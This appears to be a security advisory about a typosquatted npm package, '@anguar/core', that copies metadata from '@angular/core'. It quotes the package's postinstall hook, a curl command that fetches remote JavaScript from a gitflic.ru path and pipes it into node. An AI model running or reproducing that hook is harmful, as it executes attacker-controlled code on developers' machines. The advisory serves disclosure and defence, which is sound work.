## Source: amazon-inspector (428f991afc1ada001d59a546b8290c039dc16c98f6e497346acd87b8c08034eb)
Package @anguar/core impersonates @angular/core: scope name differs by one letter and package.json name, description, author, and repository metadata are copied from the real @angular/core. The package.json declares a postinstall lifecycle hook that runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`, fetching JavaScript from a gitflic.ru path under the user `hellscripter` (proxied through web.archive.org) and piping it into Node. The remote source is unpinned, unverified, hosted on infrastructure unrelated to the Angular project, and under full control of a third party. Any developer who mistypes the Angular scope and runs `npm install` will execute arbitrary attacker-controlled code on their machine.

cwes.description: The product contains code that appears to be malicious in nature.
